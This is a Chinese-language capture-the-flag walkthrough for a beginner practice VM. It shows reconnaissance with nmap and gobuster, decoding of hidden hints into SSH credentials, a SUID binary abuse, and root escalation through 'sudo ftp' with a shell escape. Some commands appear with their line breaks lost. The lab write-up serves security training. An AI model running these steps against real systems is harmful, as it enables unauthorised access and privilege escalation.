虚拟机简介：您的任务是获取所有3个flag（user1.txt，user2.txt，proof.txt）

目标：3个flag

级别：初级

1、通过arp-scan检测主机IP地址

arp-scan -l

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.10
查看开放22、80端口

3、WEB渗透测试

3.1 使用dirb和nikto进行探测均没有发现有用信息，打开首页查看源代码提示检查robots.txt

打开robots.txt，查看源代码显示hint目录

3.2 访问hint页面，查看源代码有一段base64加密文件

使用base32进行解码，没有任何有用信息

3.3 使用gobuster进行扫描,得到/entry.js和/fotocd

cd /opt/git clone https://github.com/danielmiessler/SecLists.gitgobuster dir -u http://192.168.1.10 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.txt,.js,/,.html

访问/entry.js,得到用户名为：monica

3.4 访问/fotocd/目录查看源代码显示Brainfuck编码的字符串

3.5 解码后得到一段base64编码的提示

在线解码地址：http://esoteric.sange.fi/brainfuck/impl/interp/i.html

其中base64编码解码以后为$99990$

echo JDk5OTkwJA== | base64 -d

3.6 使用账号：monica，密码：$99990$ 登录成功

ssh monica@192.168.1.10

查看当前目录中的文件得到第一个flag

lscat user1.txt

3.7 遍历访问joey目录，显示note.txt让访问/fotocd/0x0343548764，得到joey.zip

3.8 使用john进行zip爆破未成功

zip2john joey.zip >> password.txtjohn password.txt

3.9 查找suid权限二进制，执行二进制以后切换用户为chandler

find / -type f -perm -u=s 2>/dev/null/opt/exec/chandler

3.10 进入当前用户主目录，有一个.cache文件夹中有user2.txt和note.txt

cd /home/chandler/ls -lahcd .cache/

3.11 查看user2.txt得到第二个flag，查看note.txt得到提示的base64加密

base64无法解开，使用base32解开后得到密码为：Y0uCr4ckM3

echo OBQXG43XMQ5FSMDVINZDIY3LJUZQ==== | base32 -d

4、系统提权

4.1 切换到chandler用户查看sudo权限,可以使用ftp进行提权

su chandlersudo -l

4.2 使用ftp进行提权,获取最后一个flag

sudo ftp!/bin/bashls /rootcat /root/proof.txt
